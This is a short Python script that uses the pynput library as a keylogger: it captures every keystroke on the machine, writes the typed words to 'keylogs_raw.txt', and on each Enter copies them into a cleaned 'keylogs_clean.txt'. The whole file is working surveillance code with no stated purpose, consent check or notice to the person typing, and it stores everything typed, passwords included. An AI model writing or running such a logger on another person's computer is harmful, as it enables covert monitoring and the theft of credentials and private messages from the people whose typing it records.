from pynput import keyboard
from pynput.keyboard import Controller, Key, Listener
keys = ""
words = ""
def on_press(key):
    global words
    if key != Key.space:
        skey = str(key)
        nkey = skey.replace("'", "")
        words += nkey
    elif key == Key.space or key == Key.enter:
        with open("keylogs_raw.txt", "a+") as f:
            f.write(words+" ")
        words = ""
        f.close()

def on_release(key):
    if key == Key.enter:
        editfile("keylogs_raw.txt", "keylogs_clean.txt")

def editfile(raw, clean):
    fin = open(raw, "r")
    fout = open(clean, "w+")
    for line in fin:
        fout.write(line.replace('Key.enter', '\n'))
    fin.close()
    fout.close()
            
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

